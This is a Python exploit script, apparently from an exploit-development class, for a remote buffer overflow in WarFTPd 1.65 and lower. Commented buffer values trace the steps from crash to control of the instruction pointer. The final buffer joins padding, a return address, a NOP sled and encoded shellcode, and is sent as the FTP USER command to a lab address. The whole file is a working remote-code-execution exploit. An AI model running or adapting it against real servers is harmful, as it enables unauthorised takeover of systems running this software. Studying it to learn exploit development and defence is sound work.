#!/usr/bin/python
# Exploits WARFTPd 1.65 or lower
# Created during Georgia Weidman's Intro to Exploit Development class.
# Previous buffer values left in place as comments to show the progression from basic
# buffer overflow to remote code execution.

import socket
import sys

#buffer = "A" * 1100
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"

#buffer = "A" * 485 + "B" * 4 + "C" * 611

#buffer = "A" * 485 + "\x53\x93\x42\x7e" + "C" * 4 + 607

shellcode = ("\xba\x0b\x90\x19\x50\xd9\xc5\xd9\x74\x24\xf4\x58\x33\xc9" +
"\xb1\x56\x83\xc0\x04\x31\x50\x0f\x03\x50\x04\x72\xec\xac" +
"\xf2\xfb\x0f\x4d\x02\x9c\x86\xa8\x33\x8e\xfd\xb9\x61\x1e" +
"\x75\xef\x89\xd5\xdb\x04\x1a\x9b\xf3\x2b\xab\x16\x22\x05" +
"\x2c\x97\xea\xc9\xee\xb9\x96\x13\x22\x1a\xa6\xdb\x37\x5b" +
"\xef\x06\xb7\x09\xb8\x4d\x65\xbe\xcd\x10\xb5\xbf\x01\x1f" +
"\x85\xc7\x24\xe0\x71\x72\x26\x31\x29\x09\x60\xa9\x42\x55" +
"\x51\xc8\x87\x85\xad\x83\xac\x7e\x45\x12\x64\x4f\xa6\x24" +
"\x48\x1c\x99\x88\x45\x5c\xdd\x2f\xb5\x2b\x15\x4c\x48\x2c" +
"\xee\x2e\x96\xb9\xf3\x89\x5d\x19\xd0\x28\xb2\xfc\x93\x27" +
"\x7f\x8a\xfc\x2b\x7e\x5f\x77\x57\x0b\x5e\x58\xd1\x4f\x45" +
"\x7c\xb9\x14\xe4\x25\x67\xfb\x19\x35\xcf\xa4\xbf\x3d\xe2" +
"\xb1\xc6\x1f\x6b\x76\xf5\x9f\x6b\x10\x8e\xec\x59\xbf\x24" +
"\x7b\xd2\x48\xe3\x7c\x15\x63\x53\x12\xe8\x8b\xa4\x3a\x2f" +
"\xdf\xf4\x54\x86\x5f\x9f\xa4\x27\x8a\x30\xf5\x87\x64\xf1" +
"\xa5\x67\xd4\x99\xaf\x67\x0b\xb9\xcf\xad\x3a\xfd\x01\x95" +
"\x6f\x6a\x60\x29\x9e\x36\xed\xcf\xca\xd6\xbb\x58\x62\x15" +
"\x98\x50\x15\x66\xca\xcc\x8e\xf0\x42\x1b\x08\xfe\x52\x09" +
"\x3b\x53\xfa\xda\xcf\xbf\x3f\xfa\xd0\x95\x17\x75\xe9\x7e" +
"\xed\xeb\xb8\x1f\xf2\x21\x2a\x83\x61\xae\xaa\xca\x99\x79" +
"\xfd\x9b\x6c\x70\x6b\x36\xd6\x2a\x89\xcb\x8e\x15\x09\x10" +
"\x73\x9b\x90\xd5\xcf\xbf\x82\x23\xcf\xfb\xf6\xfb\x86\x55" +
"\xa0\xbd\x70\x14\x1a\x14\x2e\xfe\xca\xe1\x1c\xc1\x8c\xed" +
"\x48\xb7\x70\x5f\x25\x8e\x8f\x50\xa1\x06\xe8\x8c\x51\xe8" +
"\x23\x15\x61\xa3\x69\x3c\xea\x6a\xf8\x7c\x77\x8d\xd7\x43" +
"\x8e\x0e\xdd\x3b\x75\x0e\x94\x3e\x31\x88\x45\x33\x2a\x7d" +
"\x69\xe0\x4b\x54")

buffer = "A" * 485 + "\x53\x93\x42\x7e" + "\x90" * 239 + shellcode

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.3.130',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + "\r\n")
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()

